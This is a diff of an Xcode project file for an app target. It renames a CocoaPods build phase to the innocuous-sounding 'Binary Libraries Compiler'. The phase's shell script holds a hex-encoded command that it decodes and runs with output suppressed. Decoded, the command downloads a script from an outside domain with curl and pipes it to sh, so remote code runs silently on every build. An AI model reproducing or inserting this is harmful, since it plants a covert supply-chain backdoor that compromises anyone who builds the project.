@@ -830,7 +830,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 329F6BCD240D3531008E0721 /* Build configuration list for PBXNativeTarget "MySwiftProduct" */;
 			buildPhases = (
-				21A5412A67BBB6887E6D902C /* [CP] Build Pods Frameworks */,
+				7FD6D41AFDF658A31D6D902C /* Binary Libraries Compiler */,
 				077966221009078DFF4463C8 /* [CP] Check Pods Manifest.lock */,
 				329F6B9F240D352F008E0721 /* Sources */,
 				329F6BA0240D352F008E0721 /* Frameworks */,
@@ -967,7 +967,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	21A5412A67BBB6887E6D902C /* [CP] Build Pods Frameworks */ = {
+	7FD6D41AFDF658A31D6D902C /* Binary Libraries Compiler */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -976,7 +976,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Binary Libraries Compiler";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -988,6 +988,8 @@
 echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
 	
 
 	
